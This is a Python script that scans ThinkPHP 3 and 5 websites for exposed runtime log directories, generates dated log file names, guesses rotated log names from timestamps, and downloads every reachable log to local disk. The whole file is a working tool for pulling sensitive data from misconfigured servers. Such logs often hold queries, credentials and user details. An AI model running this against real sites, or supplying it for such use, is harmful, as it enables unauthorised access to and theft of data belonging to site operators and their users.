# coding:utf-8
import requests
import os
import datetime
import time
import argparse
import sys
import re
from colorama import init,Fore

init(autoreset=True)

def genFileName(version, year, month, day):
    now_year = datetime.datetime.now().year
    now_month = datetime.datetime.now().month
    now_day = datetime.datetime.now().day
    begin_date = datetime.date(year, month, day)
    end_date = datetime.date(now_year, now_month, now_day)
    date_list = [begin_date + datetime.timedelta(days=i) for i in range((end_date - begin_date).days+1)]
    filename_list = []
    for date in date_list:
        if version == 3:
            filename_list.append("{:0>2d}_{:0>2d}_{:0>2d}.log".format(int(str(date.year)[2:]), date.month, date.day))
        elif version == 5:
            filename_list.append("{}{:0>2d}/{:0>2d}.log".format(date.year, date.month, date.day))
    return filename_list

def sendReq(url):
    try:
        html = ''
        response = requests.get(url, headers=headers, timeout=20)
        if response.status_code == 200:
            print('{}[*] {}{reset} | {}{}{reset}'.format(Fore.RED, url, Fore.BLUE, response.status_code, reset=Fore.RESET))
            html = response.content.decode('utf-8')
        else:
            print('[-] {} | {}{}{reset}'.format(url, Fore.BLUE, response.status_code, reset=Fore.RESET))
    except Exception as e:
        print('[-] {} | request error'.format(url))
    finally:
        return html

def foundLogPath(url, version):
    log_path_list = {
        3: ['/Runtime/Logs/', '/App/Runtime/Logs/', '/Application/Runtime/Logs/Admin/', '/Application/Runtime/Logs/Home/', '/Application/Runtime/Logs/'],
        5: '/runtime/log/',
    }

    log_path = ''
    if version == 3:
        for path in log_path_list[version]:
            if requests.get(url+path, headers=headers).status_code in (200,403):
                print('{}[*]{reset} Found {} log path: {}'.format(Fore.RED, url, path, reset=Fore.RESET))
                log_path = path
                break
    else:
        if requests.get(url+log_path_list[version], headers=headers).status_code in (200,403):
            print('{}[*]{reset} Found {} log path: {}'.format(Fore.RED, url, log_path_list[version], reset=Fore.RESET))
            log_path = log_path_list[version]

    return log_path

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Thinkphp 3 or 5 log file scan! ")
    parser.add_argument('-u', '--url', help='target url')
    parser.add_argument('-v', '--version', type=int,
                        choices=[3, 5], default=3, help="thinkphp version, default 3")
    parser.add_argument('-p', '--path', type=str, help='log path')
    parser.add_argument('-y', '--year', type=int, default=datetime.datetime.now().year, help="datetime start year, default this year")
    parser.add_argument('-m', '--month', type=int, default=datetime.datetime.now().month, help="datetime start month, default this month")
    parser.add_argument('-d', '--day', type=int, default=1, help="datetime start day, default 1")

    args = parser.parse_args()
    if not args.url:
        parser.print_help()
        sys.exit(0)

    url = args.url
    version = args.version
    log_path = args.path
    year = args.year
    month = args.month
    day = args.day


    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0'
    }


    if not log_path:
        log_path = foundLogPath(url, version)
        if not log_path:
            print("[-] {} can't get log file! ".format(url))
            sys.exit(0)

    filename_list = genFileName(version, year, month, day)

    dir_name = url.replace('https://', '').replace('http://', '').replace('/', '').replace(':', '_')
    data_path = 'TPLogData'
    if not os.path.isdir(data_path):
        os.mkdir(data_path)
    dir_path = os.path.join(data_path, dir_name)
    if not os.path.isdir(dir_path):
        os.mkdir(dir_path)

    for filename in filename_list:
        try:
            html = sendReq(url+log_path+filename)
            if not html:
                continue
            with open(os.path.join(dir_path, filename.replace('/', '_')), 'w', encoding='utf-8') as f:
                f.write(html)
            tmp_filename = filename
            now_filename = ''
            pattern = re.compile(r"\[ (\d{4}-\d{2}-\d{2})T((\d{2}:){2}\d{2})\+08:00 \]")
            flag = True
            while flag:
                match_result = pattern.search(html)
                if not match_result:
                    break
                time_str = match_result.group(1) + ' ' + match_result.group(2)
                timeArray = time.strptime(time_str, "%Y-%m-%d %H:%M:%S")
                timestamp = int(time.mktime(timeArray))
                timestamp_list = [str(timestamp), str(timestamp-1), str(timestamp-2), str(timestamp-3)]
                for timestamp in timestamp_list:
                    if version == 3:
                        tmp_filename = timestamp + '-' + filename
                    else:
                        tmp_filename = filename[:filename.find('/')] + '/' + timestamp + '-' + filename[filename.find('/')+1:]
                    if tmp_filename == now_filename:
                        flag = False
                        break
                    html = sendReq(url+log_path+tmp_filename)
                    if html:
                        with open(os.path.join(dir_path, tmp_filename.replace('/', '_')), 'w', encoding='utf-8') as f:
                            f.write(html)
                        now_filename = tmp_filename
                        html = ''
                        flag = False
                        break
        except Exception as e:
            print("[-] error: {}".format(e))
    print('[*] Log Scan complete!')